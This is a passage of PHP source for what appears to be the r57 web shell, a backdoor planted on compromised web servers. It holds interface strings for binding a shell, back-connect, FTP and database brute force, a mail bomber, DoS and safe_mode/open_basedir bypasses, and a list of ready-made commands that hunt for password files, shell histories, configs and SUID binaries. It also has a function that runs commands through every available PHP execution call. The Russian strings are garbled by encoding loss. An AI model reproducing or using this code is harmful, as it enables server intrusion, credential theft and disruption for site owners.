'ru_text62'=>'?и??к?о?и? ?оз?а?а',
'ru_text63'=>'Oайл ??ал??',
'ru_text64'=>'?и??к?о?и? ??ал??а',
'ru_text65'=>'?оз?а?ь',
'ru_text66'=>'??али?ь',
'ru_text67'=>'Chown/Chgrp/Chmod',
'ru_text68'=>'Eо?а??а',
'ru_text69'=>'Iа?а????1',
'ru_text70'=>'Iа?а????2',
'ru_text71'=>"A?о?ой па?а???? ко?а??ы:\r\n- ?л? CHOWN - и?? ?ово?о пользова??л? или ??о UID (чи?ло?) \r\n- ?л? ко?а??ы CHGRP - и?? ???ппы или GID (чи?ло?) \r\n- ?л? ко?а??ы CHMOD - ??ло? чи?ло в во?ь???ич?о? п?????авл??ии (?ап?и??? 0777)",
'ru_text72'=>'??к?? ?л? пои?ка',
'ru_text73'=>'E?ка?ь в папк?',
'ru_text74'=>'E?ка?ь в файла?',
'ru_text75'=>'* ?о??о и?пользова?ь ????л???о? вы?а???и?',
'ru_text76'=>'Iои?к ??к??а в файла? ? по?ощь? ??или?ы find',
'ru_text80'=>'?ип',
'ru_text81'=>'???ь',
'ru_text82'=>'?азы ?а??ы?',
'ru_text83'=>'Aыпол???и? SQL зап?о?а',
'ru_text84'=>'SQL зап?о?',
'ru_text85'=>'I?ов??ка воз?о??о??и о??о?а о??а?ич??ий safe_mode ч???з выпол???и? ко?а?? в MSSQL ???в???',
'ru_text86'=>'?качива?и? файла ? ???в??а',
'ru_butt14'=>'?кача?ь',
'ru_text87'=>'?качива?и? файлов ? ??ал???о?о ftp-???в??а',
'ru_text88'=>'???в??:по??',
'ru_text89'=>'Oайл ?а ftp ???в???',
'ru_text90'=>'???и? п????ачи',
'ru_text91'=>'A??иви?ова?ь в',
'ru_text92'=>'??з а??ив.',
'ru_text93'=>'FTP',
'ru_text94'=>'FTP-????фо??',
'ru_text95'=>'?пи?ок пользова??л?й',
'ru_text96'=>'?? ??ало?ь пол?чи?ь ?пи?ок пользова??л?й',
'ru_text97'=>'I?ов????о ко??и?а?ий: ',
'ru_text98'=>'??ач?ы? по?кл?ч??ий: ',
'ru_text99'=>'/etc/passwd',
'ru_text100'=>'I?п?авка файлов ?а ??ал???ый ф?п ???в??',
'ru_text101'=>'п???в?????о? (user -> resu)',
'ru_text102'=>'Iоч?а',
'ru_text103'=>'I?п?авка пи?ь?а',
'ru_text104'=>'I?п?авка файла ?а поч?овый ?щик',
'ru_text105'=>'Eо??',
'ru_text106'=>'I?',
'ru_text107'=>'???а',
'ru_butt15'=>'I?п?ави?ь',
'ru_text108'=>'??к?? пи?ь?а',
'ru_text109'=>'?в?????ь',
'ru_text110'=>'?азв?????ь',
'ru_text111'=>'SQL-???в?? : по??',
'ru_text112'=>'I?ов??ка воз?о??о??и о??о?а о??а?ич??ий safe_mode ч???з и?пользова?и? ф??к?ии mb_send_mail (PHP <= 4.0-4.2.2, 5.x)',
'ru_text113'=>'I?ов??ка воз?о??о??и о??о?а о??а?ич??ий safe_mode, п?о??о?? ли??и??а ?и??к?о?ий ? и?пользова?и?? imap_list (PHP <= 5.1.2)',
'ru_text114'=>'I?ов??ка воз?о??о??и о??о?а о??а?ич??ий safe_mode, п?о??о?? ?о????и?о?о файла ? и?пользова?и?? imap_body (PHP <= 5.1.2)',
'ru_text115'=>'I?ов??ка воз?о??о??и о??о?а о??а?ич??ий safe_mode, копи?ова?и? файлов ? [compress.zlib://] (PHP <= 4.4.2, 5.1.2)',
'ru_text116'=>'Eопи?ова?ь файл',
'ru_text117'=>'в',
'ru_text118'=>'Oайл ?копи?ова?',
'ru_text119'=>'?? ??ало?ь ?копи?ова?ь файл',
'ru_text120'=>'I?ов??ка воз?о??о??и о??о?а о??а?ич??ий safe_mode, п?о??о?? ?о????и?о?о файла ? и?пользова?и?? ini_restore (PHP <= 4.4.4, 5.1.6) By KingDefacer',
'ru_text121'=>'I?ов??ка воз?о??о??и о??о?а о??а?ич??ий open_basedir, п?о??о?? ли??и??а ?и??к?о?ий ? и?пользова?и?? fopen (PHP v4.4.0 memory leak) By KingDefacer',
'ru_text122'=>'I?ов??ка воз?о??о??и о??о?а о??а?ич??ий open_basedir, п?о??о?? ли??и??а ?и??к?о?ий ? и?пользова?и?? glob (PHP <= 5.2.x)',
'ru_text123'=>'I?ов??ка воз?о??о??и о??о?а о??а?ич??ий open_basedir, ч???и? *.bzip а??ива [compress.bzip2://] (PHP <= 5.2.1)',
'ru_text124'=>'I?ов??ка воз?о??о??и о??о?а о??а?ич??ий open_basedir, ?озапи?ь файлов ? error_log[php://] (PHP <= 5.1.4, 4.4.2)',
'ru_text125'=>'?а??ы?',
'ru_text126'=>'I?ов??ка воз?о??о??и о??о?а о??а?ич??ий open_basedir, ?оз?а?и? файла ????ии ? ?а??ы?и[NULL-byte] (PHP <= 5.2.0)',
'ru_text127'=>'I?ов??ка воз?о??о??и о??о?а о??а?ич??ий open_basedir, ?озапи?ь файлов ? readfile[php://] (PHP <= 5.2.1, 4.4.4)',
'ru_text128'=>'?а?а из?????и?\?о???па(touch)',
'ru_text129'=>'I?ов??ка воз?о??о??и о??о?а о??а?ич??ий open_basedir, ?оз?а?и? файла ? fopen[srpath://] (PHP v5.2.0)',
'ru_text130'=>'I?ов??ка воз?о??о??и о??о?а о??а?ич??ий open_basedir, ч???и? *.zip а??ива [zip://] (PHP <= 5.2.1)',
'ru_text131'=>'I?ов??ка воз?о??о??и о??о?а о??а?ич??ий open_basedir, п?о??о?? ?о????и?о?о файла ? и?пользова?и?? symlink() (PHP <= 5.2.1)',
'ru_text132'=>'I?ов??ка воз?о??о??и о??о?а о??а?ич??ий open_basedir, п?о??о?? ли??и??а ?и??к?о?ий ? и?пользова?и?? symlink() (PHP <= 5.2.1)',
'ru_text133'=>'',
'ru_text134'=>'????фо?? ?аз ?а??ы?',
'ru_text135'=>'?лова?ь',
'ru_text136'=>'?оз?а?и? ?и?воль?ой ??ылки',
'ru_text137'=>'Iол?з?о?',
'ru_text138'=>'Iпа??о?',
'ru_text139'=>'?аил-?о????',
'ru_text140'=>'DoS',
'ru_text141'=>'I??о?о??о! Aоз?о??? к?а? A??-???ви?а.',
'ru_err0'=>'I?и?ка! ?? ?о?? запи?а?ь в файл ',
'ru_err1'=>'I?и?ка! ?? ?о?? п?очи?а?ь файл ',
'ru_err2'=>'I?и?ка! ?? ??ало?ь ?оз?а?ь ',
'ru_err3'=>'I?и?ка! ?? ??ало?ь по?кл?чи?ь?? к ftp ???в???',
'ru_err4'=>'I?и?ка ав?о?иза?ии ?а ftp ???в???',
'ru_err5'=>'I?и?ка! ?? ??ало?ь по?????ь ?и??к?о?и? ?а ftp ???в???',
'ru_err6'=>'I?и?ка! ?? ??ало?ь о?п?ави?ь пи?ь?о',
'ru_err7'=>'Iи?ь?о о?п?авл??о',
/* --------------------------------------------------------------- */
'eng_text1' =>'Executed command',
'eng_text2' =>'Execute command on server',
'eng_text3' =>'Run command',
'eng_text4' =>'Work directory',
'eng_text5' =>'Upload files on server',
'eng_text6' =>'Local file',
'eng_text7' =>'Aliases',
'eng_text8' =>'Select alias',
'eng_butt1' =>'Execute',
'eng_butt2' =>'Upload',
'eng_text9' =>'Bind port to /bin/bash',
'eng_text10'=>'Port',
'eng_text11'=>'Password for access',
'eng_butt3' =>'Bind',
'eng_text12'=>'back-connect',
'eng_text13'=>'IP',
'eng_text14'=>'Port',
'eng_butt4' =>'Connect',
'eng_text15'=>'Upload files from remote server',
'eng_text16'=>'With',
'eng_text17'=>'Remote file',
'eng_text18'=>'Local file',
'eng_text19'=>'Exploits',
'eng_text20'=>'Use',
'eng_text21'=>'&nbsp;New name',
'eng_text22'=>'datapipe',
'eng_text23'=>'Local port',
'eng_text24'=>'Remote host',
'eng_text25'=>'Remote port',
'eng_text26'=>'Use',
'eng_butt5' =>'Run',
'eng_text28'=>'Work in safe_mode',
'eng_text29'=>'ACCESS DENIED',
'eng_butt6' =>'Change',
'eng_text30'=>'Cat file',
'eng_butt7' =>'Show',
'eng_text31'=>'File not found',
'eng_text32'=>'Eval PHP code',
'eng_text33'=>'Test bypass open_basedir with cURL functions(PHP <= 4.4.2, 5.1.4)',
'eng_butt8' =>'Test',
'eng_text34'=>'Test bypass safe_mode with include function',
'eng_text35'=>'Test bypass safe_mode with load file in mysql',
'eng_text36'=>'Database . Table',
'eng_text37'=>'Login',
'eng_text38'=>'Password',
'eng_text39'=>'Database',
'eng_text40'=>'Dump database table',
'eng_butt9' =>'Dump',
'eng_text41'=>'Save dump in file',
'eng_text42'=>'Edit files',
'eng_text43'=>'File for edit',
'eng_butt10'=>'Save',
'eng_text44'=>'Can\'t edit file! Only read access!',
'eng_text45'=>'File saved',
'eng_text46'=>'Show phpinfo()',
'eng_text47'=>'Show variables from php.ini',
'eng_text48'=>'Delete temp files',
'eng_butt11'=>'Edit file',
'eng_text49'=>'Delete script from server',
'eng_text50'=>'View cpu info',
'eng_text51'=>'View memory info',
'eng_text52'=>'Find text',
'eng_text53'=>'In dirs',
'eng_text54'=>'Find text in files',
'eng_butt12'=>'Find',
'eng_text55'=>'Only in files',
'eng_text56'=>'Nothing :(',
'eng_text57'=>'Create/Delete File/Dir',
'eng_text58'=>'name',
'eng_text59'=>'file',
'eng_text60'=>'dir',
'eng_butt13'=>'Create/Delete',
'eng_text61'=>'File created',
'eng_text62'=>'Dir created',
'eng_text63'=>'File deleted',
'eng_text64'=>'Dir deleted',
'eng_text65'=>'Create',
'eng_text66'=>'Delete',
'eng_text67'=>'Chown/Chgrp/Chmod',
'eng_text68'=>'Command',
'eng_text69'=>'param1',
'eng_text70'=>'param2',
'eng_text71'=>"Second commands param is:\r\n- for CHOWN - name of new owner or UID\r\n- for CHGRP - group name or GID\r\n- for CHMOD - 0777, 0755...",
'eng_text72'=>'Text for find',
'eng_text73'=>'Find in folder',
'eng_text74'=>'Find in files',
'eng_text75'=>'* you can use regexp',
'eng_text76'=>'Search text in files via find',
'eng_text80'=>'Type',
'eng_text81'=>'Net',
'eng_text82'=>'Databases',
'eng_text83'=>'Run SQL query',
'eng_text84'=>'SQL query',
'eng_text85'=>'Test bypass safe_mode with commands execute via MSSQL server',
'eng_text86'=>'Download files from server',
'eng_butt14'=>'Download',
'eng_text87'=>'Download files from remote ftp-server',
'eng_text88'=>'server:port',
'eng_text89'=>'File on ftp',
'eng_text90'=>'Transfer mode',
'eng_text91'=>'Archivation',
'eng_text92'=>'without arch.',
'eng_text93'=>'FTP',
'eng_text94'=>'FTP-bruteforce',
'eng_text95'=>'Users list',
'eng_text96'=>'Can\'t get users list',
'eng_text97'=>'checked: ',
'eng_text98'=>'success: ',
'eng_text99'=>'/etc/passwd',
'eng_text100'=>'Send file to remote ftp server',
'eng_text101'=>'Use reverse (user -> resu)',
'eng_text102'=>'Mail',
'eng_text103'=>'Send email',
'eng_text104'=>'Send file to email',
'eng_text105'=>'To',
'eng_text106'=>'From',
'eng_text107'=>'Subj',
'eng_butt15'=>'Send',
'eng_text108'=>'Mail',
'eng_text109'=>'Hide',
'eng_text110'=>'Show',
'eng_text111'=>'SQL-Server : Port',
'eng_text112'=>'Test bypass safe_mode with function mb_send_mail (PHP <= 4.0-4.2.2, 5.x)',
'eng_text113'=>'Test bypass safe_mode, view dir list via imap_list (PHP <= 5.1.2)',
'eng_text114'=>'Test bypass safe_mode, view file contest via imap_body (PHP <= 5.1.2)',
'eng_text115'=>'Test bypass safe_mode, copy file via copy[compress.zlib://] (PHP <= 4.4.2, 5.1.2)',
'eng_text116'=>'Copy from',
'eng_text117'=>'to',
'eng_text118'=>'File copied',
'eng_text119'=>'Cant copy file',
'eng_text120'=>'Test bypass safe_mode via ini_restore (PHP <= 4.4.4, 5.1.6) By KingDefacer',
'eng_text121'=>'Test bypass open_basedir, view dir list via fopen (PHP v4.4.0 memory leak) By KingDefacer',
'eng_text122'=>'Test bypass open_basedir, view dir list via glob (PHP <= 5.2.x)',
'eng_text123'=>'Test bypass open_basedir, read *.bzip file via [compress.bzip2://] (PHP <= 5.2.1)',
'eng_text124'=>'Test bypass open_basedir, add data to file via error_log[php://] (PHP <= 5.1.4, 4.4.2)',
'eng_text125'=>'Data',
'eng_text126'=>'Test bypass open_basedir, create file via session_save_path[NULL-byte] (PHP <= 5.2.0)',
'eng_text127'=>'Test bypass open_basedir, add data to file via readfile[php://] (PHP <= 5.2.1, 4.4.4)',
'eng_text128'=>'Modify/Access date(touch)',
'eng_text129'=>'Test bypass open_basedir, create file via fopen[srpath://] (PHP v5.2.0)',
'eng_text130'=>'Test bypass open_basedir, read *.zip file via [zip://] (PHP <= 5.2.1)',
'eng_text131'=>'Test bypass open_basedir, view file contest via symlink() (PHP <= 5.2.1)',
'eng_text132'=>'Test bypass open_basedir, view dir list via symlink() (PHP <= 5.2.1)',
'eng_text133'=>'',
'eng_text134'=>'Database-bruteforce',
'eng_text135'=>'Dictionary',
'eng_text136'=>'Creating evil symlink',
'eng_text137'=>'Useful',
'eng_text138'=>'Dangerous',
'eng_text139'=>'Mail Bomber',
'eng_text140'=>'DoS',
'eng_text141'=>'Danger! Web-daemon crash possible.',
'eng_err0'=>'Error! Can\'t write in file ',
'eng_err1'=>'Error! Can\'t read file ',
'eng_err2'=>'Error! Can\'t create ',
'eng_err3'=>'Error! Can\'t connect to ftp',
'eng_err4'=>'Error! Can\'t login on ftp server',
'eng_err5'=>'Error! Can\'t change dir on ftp',
'eng_err6'=>'Error! Can\'t sent mail',
'eng_err7'=>'Mail send',
);
/*
Aлиа?ы ко?а??
Iозвол??? из???а?ь ??о?ок?а??о?о ?а?о?а о??и? и ???-?? ко?а??. ( ???ла?о ?ла?о?а?? ?о?й п?и?о??ой л??и )
Aы ?о???? ?а?и ?о?авл??ь или из?????ь ко?а??ы.
*/
$aliases=array(
'----------------------------------locate'=>'',
'locate httpd.conf files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate httpd.conf >> /tmp/grep.txt;cat /tmp/grep.txt',
'locate vhosts.conf files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate vhosts.conf >> /tmp/grep.txt;cat /tmp/grep.txt',
'locate proftpd.conf files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate proftpd.conf >> /tmp/grep.txt;cat /tmp/grep.txt',
'locate psybnc.conf >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate psybnc.conf >> /tmp/grep.txt;cat /tmp/grep.txt',
'locate my.conf files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate my.conf >> /tmp/grep.txt;cat /tmp/grep.txt',
'locate admin.php files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate admin.php >> /tmp/grep.txt;cat /tmp/grep.txt',
'locate cfg.php files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate cfg.php >> /tmp/grep.txt;cat /tmp/grep.txt',
'locate conf.php files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate conf.php >> /tmp/grep.txt;cat /tmp/grep.txt',
'locate config.dat files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate config.dat >> /tmp/grep.txt;cat /tmp/grep.txt',
'locate config.php files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate config.php >> /tmp/grep.txt;cat /tmp/grep.txt',
'locate config.inc files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate config.inc >> /tmp/grep.txt;cat /tmp/grep.txt',
'locate config.inc.php files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate config.inc.php >> /tmp/grep.txt;cat /tmp/grep.txt',
'locate config.default.php files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate config.default.php >> /tmp/grep.txt;cat /tmp/grep.txt',
'locate .conf files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate ".conf" >> /tmp/grep.txt;cat /tmp/grep.txt',
'locate .pwd files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate ".pwd" >> /tmp/grep.txt;cat /tmp/grep.txt',
'locate .sql files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate ".sql" >> /tmp/grep.txt;cat /tmp/grep.txt',
'locate .htpasswd files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate ".htpasswd" >> /tmp/grep.txt;cat /tmp/grep.txt',
'locate .bash_history files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate ".bash_history" >> /tmp/grep.txt;cat /tmp/grep.txt',
'locate .mysql_history files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate ".mysql_history" >> /tmp/grep.txt;cat /tmp/grep.txt',
'locate backup files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate backup >> /tmp/grep.txt;cat /tmp/grep.txt',
'locate dump files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate dump >> /tmp/grep.txt;cat /tmp/grep.txt',
'locate priv files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate priv >> /tmp/grep.txt;cat /tmp/grep.txt',
'----------------------------------tar'=>'',
'tar -czvf all.tgz -T /tmp/grep.txt'=>'tar -czvf all.tgz -T /tmp/grep.txt',
'----------------------------------1'=>'',
'locate access_log files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate access_log >> /tmp/grep.txt;cat /tmp/grep.txt',
'locate error_log files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate error_log >> /tmp/grep.txt;cat /tmp/grep.txt',
'locate access.log files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate access.log >> /tmp/grep.txt;cat /tmp/grep.txt',
'locate error.log files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate error.log >> /tmp/grep.txt;cat /tmp/grep.txt',
'locate ".log" files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate ".log" >> /tmp/grep.txt;cat /tmp/grep.txt',
'----------------------------------2'=>'',
'cat /var/log/httpd/access_log | grep pass >> /tmp/grep.txt;cat /tmp/grep.txt'=>'cat /var/log/httpd/access_log | grep pass >> /tmp/grep.txt',
'----------------------------------find'=>'',
'find suid files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find / -type f -perm -04000 -ls  >> /tmp/grep.txt;cat /tmp/grep.txt',
'find suid files in current dir >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find . -type f -perm -04000 -ls  >> /tmp/grep.txt;cat /tmp/grep.txt',
'find sgid files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find / -type f -perm -02000 -ls  >> /tmp/grep.txt;cat /tmp/grep.txt',
'find sgid files in current dir >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find . -type f -perm -02000 -ls  >> /tmp/grep.txt;cat /tmp/grep.txt',
'find all writable files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find / -type f -perm -2 -ls  >> /tmp/grep.txt;cat /tmp/grep.txt',
'find all writable files in current dir >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find . -type f -perm -2 -ls  >> /tmp/grep.txt;cat /tmp/grep.txt',
'find all writable directories >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find /  -type d -perm -2 -ls  >> /tmp/grep.txt;cat /tmp/grep.txt',
'find all writable directories in current dir >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find . -type d -perm -2 -ls  >> /tmp/grep.txt;cat /tmp/grep.txt',
'find all writable directories and files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find / -perm -2 -ls  >> /tmp/grep.txt;cat /tmp/grep.txt',
'find all writable directories and files in current dir >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find . -perm -2 -ls  >> /tmp/grep.txt;cat /tmp/grep.txt',
'find all .htpasswd files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find / -type f -name .htpasswd  >> /tmp/grep.txt;cat /tmp/grep.txt',
'find all .bash_history files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find / -type f -name .bash_history  >> /tmp/grep.txt;cat /tmp/grep.txt',
'find all .mysql_history files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find / -type f -name .mysql_history  >> /tmp/grep.txt;cat /tmp/grep.txt',
'find all .fetchmailrc files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find / -type f -name .fetchmailrc  >> /tmp/grep.txt;cat /tmp/grep.txt',
'find httpd.conf files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find / -type f -name httpd.conf >> /tmp/grep.txt;cat /tmp/grep.txt',
'find vhosts.conf files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find / -type f -name vhosts.conf >> /tmp/grep.txt;cat /tmp/grep.txt',
'find proftpd.conf files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find / -type f -name proftpd.conf >> /tmp/grep.txt;cat /tmp/grep.txt',
'find admin.php files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find / -type f -name admin.php >> /tmp/grep.txt;cat /tmp/grep.txt',
'find config* files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find / -type f -name "config*"  >> /tmp/grep.txt;cat /tmp/grep.txt',
'find cfg.php files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find / -type f -name cfg.php >> /tmp/grep.txt;cat /tmp/grep.txt',
'find conf.php files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find / -type f -name conf.php >> /tmp/grep.txt;cat /tmp/grep.txt',
'find config.dat files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find / -type f -name config.dat >> /tmp/grep.txt;cat /tmp/grep.txt',
'find config.php files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find / -type f -name config.php >> /tmp/grep.txt;cat /tmp/grep.txt',
'find config.inc files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find / -type f -name config.inc >> /tmp/grep.txt;cat /tmp/grep.txt',
'find config.inc.php files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find / -type f -name config.inc.php >> /tmp/grep.txt;cat /tmp/grep.txt',
'find config.default.php files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find / -type f -name config.default.php >> /tmp/grep.txt;cat /tmp/grep.txt',
'find *.conf files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find / -type f -name "*.conf" >> /tmp/grep.txt;cat /tmp/grep.txt',
'find *.pwd files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find / -type f -name "*.pwd" >> /tmp/grep.txt;cat /tmp/grep.txt',
'find *.sql files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find / -type f -name "*.sql" >> /tmp/grep.txt;cat /tmp/grep.txt',
'find *backup* files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find / -type f -name "*backup*" >> /tmp/grep.txt;cat /tmp/grep.txt',
'find *dump* files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find / -type f -name "*dump*" >> /tmp/grep.txt;cat /tmp/grep.txt',
'-----------------------------------'=>'',
'find /var/ access_log files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find /var/ -type f -name access_log >> /tmp/grep.txt;cat /tmp/grep.txt',
'find /var/ error_log files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find /var/ -type f -name error_log >> /tmp/grep.txt;cat /tmp/grep.txt',
'find /var/ access.log files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find /var/ -type f -name access.log >> /tmp/grep.txt;cat /tmp/grep.txt',
'find /var/ error.log files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find /var/ -type f -name error.log >> /tmp/grep.txt;cat /tmp/grep.txt',
'find /var/ "*.log" files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find /var/ -type f -name "*.log" >> /tmp/grep.txt;cat /tmp/grep.txt',
'----------------------------------------------------------------------------------------------------'=>'ls -la'
);
$table_up1  = "<tr><td bgcolor=#cccccc><font face=Verdana size=-2><b><div align=center>:: ";
$table_up2  = " ::</div></b></font></td></tr><tr><td>";
$table_up3  = "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc>";
$table_end1 = "</td></tr>";
$arrow = " <font face=Webdings color=gray>4</font>";
$lb = "<font color=black>[</font>";
$rb = "<font color=black>]</font>";
$font = "<font face=Verdana size=-2>";
$ts = "<table class=table1 width=100% align=center>";
$te = "</table>";
$fs = "<form name=form method=POST>";
$fe = "</form>";

if(isset($_GET['users'])) 
 { 
 if(!$users=get_users('/etc/passwd')) { echo "<center><font face=Verdana size=-2 color=red>".$lang[$language.'_text96']."</font></center>"; }
 else 
  { 
  echo '<center>';
  foreach($users as $user) { echo $user."<br>"; }
  echo '</center>';
  }
 echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die(); 
 }

if (!empty($_POST['dir'])) { if(@function_exists('chdir')){@chdir($_POST['dir']);} else if(@function_exists('chroot')){ @chroot($_POST['dir']);}; }
if (empty($_POST['dir'])){if(@function_exists('chdir')){$dir = @getcwd();};}else{$dir=$_POST['dir'];}
$unix = 0;
if(strlen($dir)>1 && $dir[1]==":") $unix=0; else $unix=1;
if(empty($dir))
 { 
 $os = getenv('OS');
 if(empty($os)){ $os = @php_uname(); } 
 if(empty($os)){ $os ="-"; $unix=1; } 
 else
    {
    if(@eregi("^win",$os)) { $unix = 0; }
    else { $unix = 1; }
    }
 }

if(!empty($_POST['s_dir']) && !empty($_POST['s_text']) && !empty($_POST['cmd']) && $_POST['cmd'] == "search_text")
  {
    echo $head;
    if(!empty($_POST['s_mask']) && !empty($_POST['m'])) { $sr = new SearchResult($_POST['s_dir'],$_POST['s_text'],$_POST['s_mask']); }
    else { $sr = new SearchResult($_POST['s_dir'],$_POST['s_text']); }
    $sr->SearchText(0,0);
    $res = $sr->GetResultFiles();
    $found = $sr->GetMatchesCount();
    $titles = $sr->GetTitles();
    $r = "";
    if($found > 0)
    {
      $r .= "<TABLE width=100%>";
      foreach($res as $file=>$v)
      {
        $r .= "<TR>";
        $r .= "<TD colspan=2><font face=Verdana size=-2><b>".ws(3);
        $r .= (!$unix)? str_replace("/","\\",$file) : $file;
        $r .= "</b></font></ TD>";
        $r .= "</TR>";
        foreach($v as $a=>$b)
        {
          $r .= "<TR>";
          $r .= "<TD align=center><B><font face=Verdana size=-2>".$a."</font></B></TD>";
          $r .= "<TD><font face=Verdana size=-2>".ws(2).$b."</font></TD>";
          $r .= "</TR>\n";
        }
      }
      $r .= "</TABLE>";
    echo $r;
    }
    else
    {
      echo "<P align=center><B><font face=Verdana size=-2>".$lang[$language.'_text56']."</B></font></P>";
    }
  echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
  die(); 
  }                                                          

if(!$safe_mode && strpos(ex("echo abcr57"),"r57")!=3) { $safe_mode = 1; }
$SERVER_SOFTWARE = getenv('SERVER_SOFTWARE');
if(empty($SERVER_SOFTWARE)){ $SERVER_SOFTWARE = "-"; }
function ws($i)
{
return @str_repeat("&nbsp;",$i);
}
function ex($cfe)
{
 $res = '';
 if (!empty($cfe))
 {
  if(@function_exists('exec'))
   {
    @exec($cfe,$res);
    $res = join("\n",$res);
   }
  elseif(@function_exists('shell_exec'))
   {
    $res = @shell_exec($cfe);
   }
  elseif(@function_exists('system'))
   {
    @ob_start();
    @system($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(@function_exists('passthru'))
   {
    @ob_start();
    @passthru($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(@is_resource($f = @popen($cfe,"r")))
  {
   $res = "";
   if(@function_exists('fread') && @function_exists('feof')){
    while(!@feof($f)) { $res .= @fread($f,1024); }
   }else if(@function_exists('fgets') && @function_exists('feof')){
    while(!@feof($f)) { $res .= @fgets($f,1024); }
   }
   @pclose($f);
  }
  elseif(@is_resource($f = @proc_open($cfe,array(1 => array("pipe", "w")),$pipes)))
  {
   $res = "";
   if(@function_exists('fread') && @function_exists('feof')){
    while(!@feof($pipes[1])) {$res .= @fread($pipes[1], 1024);}
   }else if(@function_exists('fgets') && @function_exists('feof')){
    while(!@feof($pipes[1])) {$res .= @fgets($pipes[1], 1024);}
   }
   @proc_close($f);
  }
  elseif(@function_exists('pcntl_exec')&&@function_exists('pcntl_fork'))
   {
    $res = '[~] Blind Command Execution via [pcntl_exec]\n\n';
    $pid = @pcntl_fork();
    if ($pid == -1) {
     $res .= '[-] Could not children fork. Exit';
    } else if ($pid) {
         if (@pcntl_wifexited($status)){$res .= '[+] Done! Command "'.$cfe.'" successfully executed.';}
         else {$res .= '[-] Error. Command incorrect.';}
    } else {
         $cfe = array(" -e 'system(\"$cfe\")'");
         if(@pcntl_exec('/usr/bin/perl',$cfe)) exit(0);
         if(@pcntl_exec('/usr/local/bin/perl',$cfe)) exit(0);
         die();
    }
   }
 }
 return $res;
}
function get_users($filename)
{
  $users = array();
  $rows=@explode("\n",readzlib($filename));
  if(!$rows) return 0;
  foreach ($rows as $string)
   {
   $user = @explode(":",trim($string));
   if(substr($string,0,1)!='#') array_push($users,$user[0]);
   }
  return $users; 
}
function err($n,$txt='')
{
echo '<table width=100% cellpadding=0 cellspacing=0><tr><td bgcolor=#cccccc><font color=red face=Verdana size=-2><div align=center><b>';
echo $GLOBALS['lang'][$GLOBALS['language'].'_err'.$n];
if(!empty($txt)) { echo " $txt"; }
echo '</b></div></font></td></tr></table>';
return null;
}
function perms($mode)
{
if (!$GLOBALS['unix']) return 0;
if( $mode & 0x1000 ) { $type='p'; }
else if( $mode & 0x2000 ) { $type='c'; }
else if( $mode & 0x4000 ) { $type='d'; }
else if( $mode & 0x6000 ) { $type='b'; }
else if( $mode & 0x8000 ) { $type='-'; }
else if( $mode & 0xA000 ) { $type='l'; }
else if( $mode & 0xC000 ) { $type='s'; }
else $type='u';
